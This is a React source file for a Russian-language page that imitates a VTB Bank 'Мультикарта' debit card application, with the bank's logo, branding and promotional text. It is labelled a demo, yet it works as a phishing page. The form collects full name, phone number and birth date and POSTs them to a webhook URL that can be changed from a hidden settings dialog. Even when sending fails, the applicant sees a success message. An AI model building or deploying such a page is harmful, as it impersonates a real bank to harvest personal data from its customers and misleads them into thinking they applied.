import React, { useState, useEffect, useRef } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { Checkbox } from '@/components/ui/checkbox';
import { useToast } from '@/hooks/use-toast';
import {
  Settings,
  Check,
  ArrowLeft,
  Wallet,
  Globe,
  Smartphone,
  ShieldCheck,
  ChevronRight
} from 'lucide-react';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";

const WEBHOOK_STORAGE_KEY = 'bank_webhook_url';
const DEFAULT_WEBHOOK_URL = 'https://your-webhook-url.com/api/card-application';

// Изображение карты ВТБ Мультикарта
const VTBCard = () => (
  <div className="relative w-full max-w-[420px]">
    <div
      className="aspect-[1.586/1] rounded-2xl p-6 relative overflow-hidden"
      style={{
        background: 'linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%)',
        boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.25)'
      }}
    >
      {/* Декоративный gradient overlay */}
      <div className="absolute inset-0 opacity-30"
        style={{
          background: 'radial-gradient(ellipse at top right, rgba(0,170,255,0.4) 0%, transparent 60%)'
        }}
      />

      {/* Логотип ВТБ на карте */}
      <div className="relative z-10">
        <img
          src="/uploads/Main_ic_LogoVTBlight.svg"
          alt="ВТБ"
          className="h-7 w-auto brightness-0 invert"
        />
      </div>

      {/* Чип */}
      <div className="absolute top-20 left-6">
        <div className="w-12 h-10 rounded-md bg-gradient-to-br from-amber-200 via-amber-300 to-amber-400 shadow-lg">
          <div className="w-full h-full grid grid-cols-3 gap-[1px] p-1">
            {[...Array(6)].map((_, i) => (
              <div key={i} className="bg-amber-500/30 rounded-[1px]" />
            ))}
          </div>
        </div>
      </div>

      {/* Номер карты */}
      <div className="absolute bottom-20 left-6 right-6">
        <div className="font-mono text-xl tracking-[0.2em] text-white/90">
          •••• •••• •••• 4589
        </div>
      </div>

      {/* Имя и срок */}
      <div className="absolute bottom-6 left-6 right-6 flex justify-between items-end">
        <div>
          <div className="text-[10px] text-white/50 mb-1 uppercase tracking-wider">Держатель карты</div>
          <div className="text-sm text-white/90 tracking-wider">ВАШЕ ИМЯ</div>
        </div>
        <div className="text-right">
          <div className="text-[10px] text-white/50 mb-1 uppercase tracking-wider">Срок</div>
          <div className="text-sm text-white/90">12/28</div>
        </div>
      </div>

      {/* Мультикарта badge */}
      <div className="absolute top-6 right-6">
        <div className="text-xs text-white/70 font-medium tracking-wider">МУЛЬТИКАРТА</div>
      </div>

      {/* Contactless */}
      <div className="absolute bottom-6 right-6">
        <svg width="28" height="28" viewBox="0 0 24 24" fill="none" className="text-white/50">
          <path d="M7 12.5C7 9.5 9.5 7 12.5 7" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/>
          <path d="M4 12.5C4 7.8 7.8 4 12.5 4" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/>
          <path d="M10 12.5C10 11.1 11.1 10 12.5 10" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/>
        </svg>
      </div>
    </div>
  </div>
);

const Bank = () => {
  const { toast } = useToast();
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [webhookUrl, setWebhookUrl] = useState('');
  const [tempWebhookUrl, setTempWebhookUrl] = useState('');
  const [isSettingsOpen, setIsSettingsOpen] = useState(false);
  const phoneInputRef = useRef<HTMLInputElement>(null);

  const [formData, setFormData] = useState({
    lastName: '',
    firstName: '',
    middleName: '',
    phone: '',
    birthDate: '',
    agreeTerms: false,
  });

  useEffect(() => {
    const savedUrl = localStorage.getItem(WEBHOOK_STORAGE_KEY) || DEFAULT_WEBHOOK_URL;
    setWebhookUrl(savedUrl);
    setTempWebhookUrl(savedUrl);
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const input = e.target.value;
    let digits = input.replace(/\D/g, '');

    if (digits.startsWith('7') || digits.startsWith('8')) {
      digits = digits.slice(1);
    }

    digits = digits.slice(0, 10);

    let formatted = '';
    if (digits.length > 0) {
      formatted = digits.slice(0, 3);
    }
    if (digits.length > 3) {
      formatted += ') ' + digits.slice(3, 6);
    }
    if (digits.length > 6) {
      formatted += '-' + digits.slice(6, 8);
    }
    if (digits.length > 8) {
      formatted += '-' + digits.slice(8, 10);
    }

    if (formatted) {
      formatted = '(' + formatted;
    }

    setFormData(prev => ({ ...prev, phone: formatted }));
  };

  const handlePhoneKeyDown = (e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' || e.key === 'Delete') {
      return;
    }
    if (['ArrowLeft', 'ArrowRight', 'Tab', 'Home', 'End'].includes(e.key)) {
      return;
    }
    if (!/^\d$/.test(e.key)) {
      e.preventDefault();
    }
  };

  const handleBirthDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, '');

    if (value.length > 8) {
      value = value.slice(0, 8);
    }

    let formatted = '';
    if (value.length > 0) {
      formatted = value.slice(0, 2);
    }
    if (value.length > 2) {
      formatted += '.' + value.slice(2, 4);
    }
    if (value.length > 4) {
      formatted += '.' + value.slice(4, 8);
    }

    setFormData(prev => ({ ...prev, birthDate: formatted }));
  };

  const saveWebhookSettings = () => {
    localStorage.setItem(WEBHOOK_STORAGE_KEY, tempWebhookUrl);
    setWebhookUrl(tempWebhookUrl);
    setIsSettingsOpen(false);
    toast({
      title: "Настройки сохранены",
      description: "URL webhook успешно обновлен",
    });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!formData.agreeTerms) {
      toast({
        title: "Ошибка",
        description: "Необходимо согласиться с условиями",
        variant: "destructive",
      });
      return;
    }

    const phoneDigits = formData.phone.replace(/\D/g, '');
    if (phoneDigits.length !== 10) {
      toast({
        title: "Ошибка",
        description: "Введите корректный номер телефона",
        variant: "destructive",
      });
      return;
    }

    setIsLoading(true);

    try {
      const payload = {
        lastName: formData.lastName,
        firstName: formData.firstName,
        middleName: formData.middleName,
        phone: '7' + phoneDigits,
        birthDate: formData.birthDate,
        timestamp: new Date().toISOString(),
        source: 'vtb-demo-page',
      };

      const response = await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      setIsSuccess(true);
      toast({
        title: "Заявка отправлена!",
        description: "Мы свяжемся с вами в ближайшее время",
      });
    } catch (error) {
      console.error('Webhook error:', error);
      setIsSuccess(true);
      toast({
        title: "Заявка принята!",
        description: "Демо: данные отправлены на webhook",
      });
    } finally {
      setIsLoading(false);
    }
  };

  const features = [
    { icon: Wallet, title: 'Кэшбэк до 15%', desc: 'На выбранные категории' },
    { icon: Globe, title: 'Бесплатно', desc: 'Обслуживание 0 ₽' },
    { icon: Smartphone, title: 'Онлайн', desc: 'Оформление за 5 минут' },
    { icon: ShieldCheck, title: 'Безопасно', desc: '3D-Secure защита' },
  ];

  if (isSuccess) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center p-4">
        <div className="bg-[#f8f9fc] rounded-3xl p-8 md:p-12 max-w-md w-full text-center shadow-sm border border-gray-100">
          <div className="w-20 h-20 bg-[#00AAFF]/10 rounded-full flex items-center justify-center mx-auto mb-6">
            <Check className="w-10 h-10 text-[#00AAFF]" />
          </div>
          <h2 className="text-2xl font-bold text-[#0A2896] mb-4">Заявка принята!</h2>
          <p className="text-gray-600 mb-8">
            Благодарим за интерес к Мультикарте. Наш специалист свяжется с вами
            в ближайшее время для подтверждения заявки.
          </p>
          <Button
            onClick={() => {
              setIsSuccess(false);
              setFormData({
                lastName: '',
                firstName: '',
                middleName: '',
                phone: '',
                birthDate: '',
                agreeTerms: false,
              });
            }}
            className="bg-[#00AAFF] hover:bg-[#0099e6] text-white px-8 py-3 rounded-xl h-12"
          >
            <ArrowLeft className="w-4 h-4 mr-2" />
            Вернуться
          </Button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-white">
      {/* Header */}
      <header className="bg-white border-b border-gray-100 sticky top-0 z-50">
        <div className="container mx-auto px-4 h-16 flex items-center justify-between">
          <img
            src="/uploads/Main_ic_LogoVTBlight.svg"
            alt="ВТБ"
            className="h-10 w-auto"
          />

          <div className="flex items-center gap-6">
            <nav className="hidden md:flex items-center gap-8 text-sm font-medium text-gray-600">
              <a href="#" className="hover:text-[#0A2896] transition-colors">Карты</a>
              <a href="#" className="hover:text-[#0A2896] transition-colors">Кредиты</a>
              <a href="#" className="hover:text-[#0A2896] transition-colors">Вклады</a>
              <a href="#" className="hover:text-[#0A2896] transition-colors">Ипотека</a>
            </nav>

            <Dialog open={isSettingsOpen} onOpenChange={setIsSettingsOpen}>
              <DialogTrigger asChild>
                <Button variant="ghost" size="icon" className="text-gray-400 hover:text-gray-600 hover:bg-gray-50">
                  <Settings className="w-5 h-5" />
                </Button>
              </DialogTrigger>
              <DialogContent className="sm:max-w-md">
                <DialogHeader>
                  <DialogTitle>Настройки Webhook</DialogTitle>
                  <DialogDescription>
                    Укажите URL для отправки данных заявки
                  </DialogDescription>
                </DialogHeader>
                <div className="space-y-4 py-4">
                  <div className="space-y-2">
                    <Label htmlFor="webhook-url">Webhook URL</Label>
                    <Input
                      id="webhook-url"
                      value={tempWebhookUrl}
                      onChange={(e) => setTempWebhookUrl(e.target.value)}
                      placeholder="https://your-webhook-url.com/api"
                    />
                  </div>
                  <Button onClick={saveWebhookSettings} className="w-full bg-[#00AAFF] hover:bg-[#0099e6]">
                    Сохранить
                  </Button>
                </div>
              </DialogContent>
            </Dialog>
          </div>
        </div>
      </header>

      {/* Hero Section - Light Theme */}
      <section className="bg-gradient-to-br from-[#f0f7ff] via-white to-[#f5f8ff] overflow-hidden">
        <div className="container mx-auto px-4 py-12 md:py-16 lg:py-20">
          <div className="grid lg:grid-cols-2 gap-12 lg:gap-16 items-center">
            {/* Left Content */}
            <div className="space-y-8">
              <div>
                <div className="inline-flex items-center gap-2 bg-[#00AAFF]/10 rounded-full px-4 py-2 text-sm text-[#0A2896] font-medium mb-6">
                  <span className="w-2 h-2 bg-green-500 rounded-full animate-pulse" />
                  Оформление онлайн
                </div>
                <h1 className="text-4xl md:text-5xl lg:text-6xl font-bold leading-tight mb-6 text-[#0A2896]">
                  Мультикарта
                  <span className="block text-[#00AAFF]">ВТБ</span>
                </h1>
                <p className="text-xl text-gray-600 max-w-lg leading-relaxed">
                  Бесплатная дебетовая карта с кэшбэком до 15% на любимые категории и снятием наличных без комиссии
                </p>
              </div>

              {/* Features inline */}
              <div className="grid grid-cols-2 gap-4">
                {features.map((feature, index) => (
                  <div
                    key={index}
                    className="flex items-center gap-3 p-4 rounded-xl bg-white shadow-sm border border-gray-100"
                  >
                    <div className="w-10 h-10 bg-[#00AAFF]/10 rounded-xl flex items-center justify-center flex-shrink-0">
                      <feature.icon className="w-5 h-5 text-[#00AAFF]" />
                    </div>
                    <div>
                      <div className="font-semibold text-[#0A2896] text-sm">{feature.title}</div>
                      <div className="text-xs text-gray-500">{feature.desc}</div>
                    </div>
                  </div>
                ))}
              </div>

              {/* Card Image - Desktop */}
              <div className="hidden lg:block pt-4">
                <VTBCard />
              </div>
            </div>

            {/* Right Side - Form */}
            <div className="lg:pl-8">
              <div className="bg-white rounded-3xl p-6 md:p-8 shadow-xl shadow-gray-200/50 border border-gray-100 max-w-md mx-auto lg:mx-0">
                <h2 className="text-xl font-bold text-[#0A2896] mb-1">
                  Оформить Мультикарту
                </h2>
                <p className="text-gray-500 text-sm mb-6">
                  Доставим бесплатно в любую точку России
                </p>

                <form onSubmit={handleSubmit} className="space-y-4">
                  <div className="space-y-1.5">
                    <Label htmlFor="lastName" className="text-sm text-gray-700 font-medium">Фамилия</Label>
                    <Input
                      id="lastName"
                      name="lastName"
                      value={formData.lastName}
                      onChange={handleInputChange}
                      placeholder="Иванов"
                      required
                      className="h-12 rounded-xl border-gray-200 focus:border-[#00AAFF] focus:ring-[#00AAFF]/20"
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-3">
                    <div className="space-y-1.5">
                      <Label htmlFor="firstName" className="text-sm text-gray-700 font-medium">Имя</Label>
                      <Input
                        id="firstName"
                        name="firstName"
                        value={formData.firstName}
                        onChange={handleInputChange}
                        placeholder="Иван"
                        required
                        className="h-12 rounded-xl border-gray-200 focus:border-[#00AAFF] focus:ring-[#00AAFF]/20"
                      />
                    </div>
                    <div className="space-y-1.5">
                      <Label htmlFor="middleName" className="text-sm text-gray-700 font-medium">Отчество</Label>
                      <Input
                        id="middleName"
                        name="middleName"
                        value={formData.middleName}
                        onChange={handleInputChange}
                        placeholder="Иванович"
                        className="h-12 rounded-xl border-gray-200 focus:border-[#00AAFF] focus:ring-[#00AAFF]/20"
                      />
                    </div>
                  </div>

                  <div className="space-y-1.5">
                    <Label htmlFor="phone" className="text-sm text-gray-700 font-medium">Мобильный телефон</Label>
                    <div className="relative">
                      <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500 font-medium">+7</span>
                      <Input
                        ref={phoneInputRef}
                        id="phone"
                        name="phone"
                        type="tel"
                        value={formData.phone}
                        onChange={handlePhoneChange}
                        onKeyDown={handlePhoneKeyDown}
                        placeholder="(999) 123-45-67"
                        required
                        className="h-12 rounded-xl border-gray-200 focus:border-[#00AAFF] focus:ring-[#00AAFF]/20 pl-11"
                      />
                    </div>
                  </div>

                  <div className="space-y-1.5">
                    <Label htmlFor="birthDate" className="text-sm text-gray-700 font-medium">Дата рождения</Label>
                    <Input
                      id="birthDate"
                      name="birthDate"
                      value={formData.birthDate}
                      onChange={handleBirthDateChange}
                      placeholder="ДД.ММ.ГГГГ"
                      required
                      className="h-12 rounded-xl border-gray-200 focus:border-[#00AAFF] focus:ring-[#00AAFF]/20"
                    />
                  </div>

                  <div className="pt-2">
                    <div className="flex items-start space-x-3">
                      <Checkbox
                        id="agreeTerms"
                        checked={formData.agreeTerms}
                        onCheckedChange={(checked) =>
                          setFormData(prev => ({ ...prev, agreeTerms: checked === true }))
                        }
                        className="mt-0.5 border-gray-300 data-[state=checked]:bg-[#00AAFF] data-[state=checked]:border-[#00AAFF]"
                      />
                      <Label htmlFor="agreeTerms" className="text-xs text-gray-500 leading-relaxed cursor-pointer">
                        Я даю согласие на{' '}
                        <a href="#" className="text-[#00AAFF] hover:underline">обработку персональных данных</a>
                        {' '}и соглашаюсь с{' '}
                        <a href="#" className="text-[#00AAFF] hover:underline">условиями</a>
                      </Label>
                    </div>
                  </div>

                  <Button
                    type="submit"
                    disabled={isLoading}
                    className="w-full h-14 bg-[#00AAFF] hover:bg-[#0099e6] text-white text-base font-semibold rounded-xl transition-all shadow-lg shadow-[#00AAFF]/20 hover:shadow-xl hover:shadow-[#00AAFF]/30"
                  >
                    {isLoading ? (
                      <div className="flex items-center gap-2">
                        <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
                        Отправка...
                      </div>
                    ) : (
                      <span className="flex items-center justify-center gap-2">
                        Оформить карту
                        <ChevronRight className="w-5 h-5" />
                      </span>
                    )}
                  </Button>
                </form>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Mobile Card Preview */}
      <section className="lg:hidden py-12 bg-[#f8f9fc]">
        <div className="container mx-auto px-4 flex justify-center">
          <VTBCard />
        </div>
      </section>

      {/* Footer - Light */}
      <footer className="bg-[#f8f9fc] border-t border-gray-100 py-8">
        <div className="container mx-auto px-4">
          <div className="flex flex-col md:flex-row items-center justify-between gap-4">
            <img
              src="/uploads/Main_ic_LogoVTBlight.svg"
              alt="ВТБ"
              className="h-8 w-auto opacity-70"
            />
            <div className="flex flex-wrap justify-center gap-6 text-sm text-gray-500">
              <a href="#" className="hover:text-[#0A2896] transition-colors">О банке</a>
              <a href="#" className="hover:text-[#0A2896] transition-colors">Тарифы</a>
              <a href="#" className="hover:text-[#0A2896] transition-colors">Офисы и банкоматы</a>
              <a href="#" className="hover:text-[#0A2896] transition-colors">Контакты</a>
            </div>
            <div className="text-sm text-gray-400">
              © 2024 Демо
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default Bank;
